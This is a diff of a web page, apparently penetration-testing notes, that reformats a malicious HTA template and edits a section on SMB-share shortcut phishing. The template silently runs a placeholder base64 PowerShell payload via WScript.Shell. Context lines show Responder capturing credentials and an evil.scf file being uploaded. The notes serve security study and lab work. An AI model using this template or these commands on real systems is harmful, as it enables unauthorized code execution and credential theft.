@@ -91,17 +91,16 @@
 </span></span></code></pre></div><h4 id="create-a-malicious-hta-file-in-local-linux-smb-share">Create a Malicious hta File in local Linux SMB share</h4>
 <p><a href="https://www.revshells.com/">revshells.com</a></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">HTA:APPLICATION</span> <span class="na">ID</span><span class="o">=</span><span class="s">&#34;shell&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">language</span><span class="o">=</span><span class="s">&#34;javascript&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">		<span class="c">&lt;!--</span><span class="nx">Replace</span> <span class="nx">your</span> <span class="nx">payload</span> <span class="nx">below</span><span class="o">--&gt;</span>
-</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="s2">&#34;&lt;PowerShell #3 Base64 Payload&gt;&#34;</span><span class="p">;</span>  
-</span></span><span class="line"><span class="cl">        <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s1">&#39;WScript.Shell&#39;</span><span class="p">).</span><span class="nx">Run</span><span class="p">(</span><span class="nx">c</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span> 
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">self</span><span class="p">.</span><span class="nx">close</span><span class="p">();&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">HTA:APPLICATION</span> <span class="na">ID</span><span class="o">=</span><span class="s">&#34;shell&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">script</span> <span class="na">language</span><span class="o">=</span><span class="s">&#34;javascript&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="s2">&#34;&lt;PowerShell #3 Base64 Payload&gt;&#34;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">            <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s1">&#39;WScript.Shell&#39;</span><span class="p">).</span><span class="nx">Run</span><span class="p">(</span><span class="nx">c</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">self</span><span class="p">.</span><span class="nx">close</span><span class="p">();&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
 </span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
 </span></span></code></pre></div><h4 id="create-a-shortcut-file-in-target-windows">Create a shortcut file in target Windows</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># In target Windows machine (powershell)</span>
@@ -112,7 +111,7 @@
 </span></span></code></pre></div><br>
 <hr>
 <h3 id="phishing-with-shortcut-with-smb-share-write-permission">Phishing with Shortcut (With SMB Share Write Permission)</h3>
-<p>If you found any interaction from target to smb share (e.g., clean up)</p>
+<p>If you found any interaction from target to smb share (e.g. cronjob)</p>
 <h4 id="start-a-local-responder-listener">Start a Local Responder Listener</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># In our local Linux machine</span>
 </span></span><span class="line"><span class="cl">sudo responder -I tun0
@@ -127,7 +126,7 @@
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mput evil.scf
 </span></span></code></pre></div><br></div></div>
     
-    <script src="/utils.js"></script>
+    <script src="/js/utils.js"></script>
     <footer>
     <hr>
     <div class="footer-text">
